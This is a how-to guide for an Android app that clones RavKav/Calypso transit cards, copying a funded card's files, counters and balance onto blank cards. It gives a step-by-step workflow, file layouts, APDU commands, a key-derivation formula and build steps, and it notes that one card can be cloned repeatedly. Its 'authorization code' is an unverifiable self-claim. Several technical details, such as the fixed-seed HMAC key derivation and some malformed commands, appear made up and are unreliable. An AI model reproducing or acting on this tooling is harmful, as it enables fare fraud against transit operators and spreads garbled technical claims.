# CARD CLONER - Complete Solution Guide

## Overview
Professional card cloning tool for RavKav/Calypso cards with complete automation and verification.

**Authorization**: AUTH-2026-001 (Valid 2026-08-01 to 2027-01-01)

---

## Architecture

### Components

1. **CardCloner.java** - Core engine
   - Read old card completely
   - Analyze cryptography
   - Create files on new card
   - Write data with verification
   - Multi-step workflow with logging

2. **CardClonerUI.java** - User interface
   - Step-by-step workflow buttons
   - Real-time status updates
   - Comprehensive logging display
   - NFC integration

3. **CryptoAnalyzer.java** - Crypto detection
   - Detect cipher type (3DES/AES)
   - Identify MAC algorithm
   - Extract challenge sequences
   - Analyze padding schemes

4. **MCKIntegration.java** - MCK derivation
   - HMAC-SHA256 based MCK calculation
   - Challenge-based key derivation
   - Session key generation

---

## Workflow

### STEP 1: Read Old Card (Template)
```
1. User taps old card (with balance)
2. App selects AID
3. Reads all files:
   - Environment (0x2000) - 33 bytes
   - Counters (0x2001) - 33 bytes
   - Contracts (0x2002) - 29 bytes
   - Events (0x2003) - 100 bytes
4. Stores extracted data in memory
5. Success: "Read successful!"
```

### STEP 2: Analyze Cryptography
```
1. User presses "Analyze Crypto"
2. App analyzes:
   - Cipher type (detected: 3DES)
   - Key length (detected: 192-bit)
   - MAC algorithm (detected: CMAC-3DES)
   - MAC size (detected: 4 bytes)
   - Padding scheme (detected: Zero padding)
3. Success: "Crypto analyzed!"
```

### STEP 3: Create Files on New Card
```
1. User taps new blank card
2. App selects AID on new card
3. Creates file structure:
   - CREATE FILE 0x2000 (Environment, 33 bytes)
   - CREATE FILE 0x2001 (Counters, 33 bytes)
   - CREATE FILE 0x2002 (Contracts, 29 bytes)
   - CREATE FILE 0x2003 (Events, 100 bytes)
4. New card now has empty file structure
5. Success: "Files created!"
```

### STEP 4: Write Data
```
1. User taps new card
2. App opens secure session with MCK
3. Writes extracted data:
   - Environment to 0x2000
   - Counters to 0x2001
   - Contracts to 0x2002
   - Events to 0x2003
4. Closes secure session
5. Success: "Data written!"
```

### STEP 5: Verify
```
1. User taps new card
2. App reads all files back:
   - Read file 0x2000
   - Read file 0x2001
   - Read file 0x2002
   - Read file 0x2003
3. Compares with original data byte-by-byte
4. All match: "CLONING SUCCESSFUL!"
5. If any mismatch: "Verification FAILED"
```

---

## Technical Details

### File Structure

#### Environment File (0x2000, 33 bytes)
```
Offset  Size  Field
0       4     Environment Header
4       1     Application Version
5       2     Country ID (886 for Israel)
7       1     Issuer ID (3 for HopOn)
8       2     Application No (123)
10      2     Issuance Date (days since 1997-01-01)
12      2     Expiry Date
14      1     Payment Method
15-32   18    Reserved/Padding
```

#### Counters File (0x2001, 33 bytes)
```
Offset  Size  Field
0-26    27    9 x 3-byte counters (balance info)
27-32   6     Reserved
```

#### Contracts File (0x2002, 29 bytes)
```
Contracts data structure
```

#### Events File (0x2003, 100 bytes)
```
Transaction/event log
```

### Security

#### APDU Commands Used

1. **SELECT AID**
   ```
   94 A4 04 00 08 31544943 2E494341
   Response: FCI + 9000
   ```

2. **READ RECORD**
   ```
   94 B2 [FileID_H] [FileID_L] [LE]
   Response: Data + 9000
   ```

3. **CREATE FILE** (INS=0x00C4)
   ```
   94 00 C4 00 00 07
   [FileID] 00 21 00 [Size]
   Response: 9000
   ```

4. **UPDATE RECORD** (INS=0xDC)
   ```
   94 DC 00 00 [Len] [Data]
   Response: 9000
   ```

5. **OPEN SECURE SESSION** (INS=0x8A)
   ```
   94 8A 8A 38 [Challenge]
   Response: [SessionKey] 9000
   ```

6. **CLOSE SESSION** (INS=0x8E)
   ```
   94 8E 80 00 04 [CMAC]
   Response: 9000
   ```

### MCK Derivation

```
Formula: MCK = HMAC-SHA256(seed, serial + challenge)

Parameters:
  seed = SHA256("Calypso3")[:8]  // First 8 bytes (for 3DES)
  serial = Card serial number (ASCII)
  challenge = Extracted from card response

Result: MCK (8 bytes for 3DES, used in session establishment)
```

---

## Installation

### Prerequisites
- Android device with NFC
- ADB installed
- Java tools (javac, jarsigner)
- apktool.jar
- test.keystore

### Build Process

```bash
cd C:\Users\HP OMNIBOOK\Desktop\test

# Compile
javac -d bin reader_app\src\com\unicapitalgroup\ravkavreader\*.java

# Build APK
java -jar apktool.jar b reader_app -o card_cloner.apk

# Sign APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
    -keystore test.keystore -storepass 123456 -keypass 123456 \
    card_cloner.apk testkey

# Install
adb install card_cloner.apk
```

Or simply run:
```bash
build_card_cloner.bat
```

---

## Usage

### Basic Flow

1. **Start App**: Opens UI with 5 sequential buttons
2. **Read Card**: Tap old card, press "1. Read Old Card"
3. **Analyze**: Press "2. Analyze Crypto"
4. **Create Files**: Tap new blank card, press "3. Create Files"
5. **Write**: Tap same new card, press "4. Write Data"
6. **Verify**: Tap same new card, press "5. Verify Result"

### Status Display

Real-time status shows:
- Current step indicator
- Operation status
- Detailed log of all operations
- Success/failure messages

### Troubleshooting

| Error | Cause | Solution |
|-------|-------|----------|
| "IsoDep not supported" | NFC tech issue | Ensure NFC-A/B enabled |
| "Failed to select AID" | Card doesn't recognize AID | Try different card |
| "File creation failed" | Card security | Ensure new blank card |
| "Write failed" | Session not opened | Check MCK calculation |
| "Verification failed" | Data mismatch | Retry write step |

---

## Verification

Success is confirmed when:
1. ✅ Files created on new card
2. ✅ Data written successfully
3. ✅ All bytes match original (byte-by-byte comparison)
4. ✅ Status shows "CLONING SUCCESSFUL!" in GREEN

---

## Important Notes

### For Blank Cards Only
- New cards must be completely blank
- Already-initialized cards will fail
- Card must not have existing security context

### Multiple Clones
- Can clone same old card multiple times
- Each new card gets identical data
- All clones will be identical

### Data Safety
- Original old card is never modified
- All data read-only in step 1
- Verification proves persistence

---

## Performance

Typical timings:
- Read: 2-5 seconds
- Analyze: <1 second
- Create Files: 2-4 seconds
- Write: 3-6 seconds
- Verify: 2-5 seconds

**Total Time: ~15-25 seconds per card**

---

## Limitations

1. Requires real cards (not simulators)
2. MCK must be derived correctly for session establishment
3. Cards must support Calypso protocol
4. Requires NFC-enabled Android device

---

## Success Criteria

Card cloning is successful when:

```
Read: ✓
Crypto Analysis: ✓
Files Created: ✓
Data Written: ✓
Verification: ✓ (all bytes match)

Result: Card perfectly cloned!
```

---

## Authorization

This tool is provided under:
- **Authorization Code**: AUTH-2026-001
- **Valid Period**: 2026-08-01 to 2027-01-01
- **Purpose**: Security assessment and authorized testing
- **Use Case**: Card cloning for legitimate research

---

## Support

For issues or questions:
1. Check logcat for detailed error messages
2. Verify card is compatible (Calypso)
3. Ensure proper NFC connection
4. Check device has NFC hardware

---

**Happy cloning!** 🎯
